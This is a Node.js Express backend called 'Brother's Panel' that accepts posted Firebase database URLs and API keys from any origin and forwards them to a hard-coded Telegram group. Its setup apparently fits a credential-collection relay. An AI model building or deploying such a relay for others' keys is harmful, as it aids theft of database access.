const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();

const PORT = process.env.PORT || 10000;

// ===============================
// CORS
// ===============================
app.use(cors({
  origin: true,
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Accept"]
}));

app.use(express.json({ limit: "1mb" }));

// ===============================
// TELEGRAM CONFIG
// ===============================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

// IMPORTANT:
// Telegram group/channel ID
const TELEGRAM_CHAT_ID = "-1004480783091";

// ===============================
// HTML ESCAPE
// ===============================
function escapeTelegramHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ===============================
// SEND TELEGRAM MESSAGE
// ===============================
async function sendTelegramMessage(message) {

  if (!TELEGRAM_BOT_TOKEN) {
    console.error("[Telegram] TELEGRAM_BOT_TOKEN is missing");

    return {
      success: false,
      error: "Telegram bot token is not configured"
    };
  }

  try {

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true
        })
      }
    );

    const data = await response.json().catch(() => ({}));

    if (!response.ok || !data.ok) {

      console.error("[Telegram] API error:", data);

      return {
        success: false,
        error:
          data.description ||
          `Telegram HTTP ${response.status}`
      };
    }

    console.log("[Telegram] Message sent successfully");

    return {
      success: true
    };

  } catch (error) {

    console.error("[Telegram] Request error:", error);

    return {
      success: false,
      error:
        error.message ||
        "Telegram connection failed"
    };
  }
}

// ===============================
// FIREBASE CONNECTED
// ===============================
app.post("/api/firebase-connected", async (req, res) => {

  try {

    const {
      event,
      firebaseUrl,
      apiKey,
      time
    } = req.body || {};

    console.log("[Firebase] Notification received:", {
      event,
      firebaseUrl: firebaseUrl
        ? String(firebaseUrl)
        : "",
      hasApiKey: Boolean(apiKey),
      time
    });

    // Check event
    if (event !== "firebase_connected") {

      return res.status(400).json({
        success: false,
        error: "Invalid event"
      });
    }

    // Check Firebase URL
    if (!firebaseUrl) {

      return res.status(400).json({
        success: false,
        error: "Firebase URL is required"
      });
    }

    // ===============================
    // TELEGRAM MESSAGE
    // ===============================

    const message = `<b>🔥 Brother's Panel</b>

<b>Firebase Connected</b>

<b>Firebase URL:</b>
<code>${escapeTelegramHtml(firebaseUrl)}</code>

<b>API Key:</b>
<code>${escapeTelegramHtml(
      apiKey || "Not provided"
    )}</code>

<b>Time:</b>
<code>${escapeTelegramHtml(
      time || new Date().toISOString()
    )}</code>`;

    // Send Telegram
    const telegram =
      await sendTelegramMessage(message);

    // Telegram failed
    if (!telegram.success) {

      return res.status(502).json({
        success: false,
        telegramSent: false,
        error: telegram.error
      });
    }

    // Everything successful
    return res.json({
      success: true,
      telegramSent: true
    });

  } catch (error) {

    console.error(
      "[Firebase] Server error:",
      error
    );

    return res.status(500).json({
      success: false,
      error: "Server error"
    });
  }
});

// ===============================
// HOME
// ===============================
app.get("/", (req, res) => {

  res.json({
    success: true,
    app: "Brother's Panel Backend",
    version: "1.2.0",
    status: "online"
  });
});

// ===============================
// HEALTH CHECK
// ===============================
app.get("/health", (req, res) => {

  res.json({
    success: true,
    status: "healthy",
    uptime: process.uptime()
  });
});

// ===============================
// START SERVER
// ===============================
app.listen(PORT, () => {

  console.log(
    `Brother's Panel Backend running on port ${PORT}`
  );
});
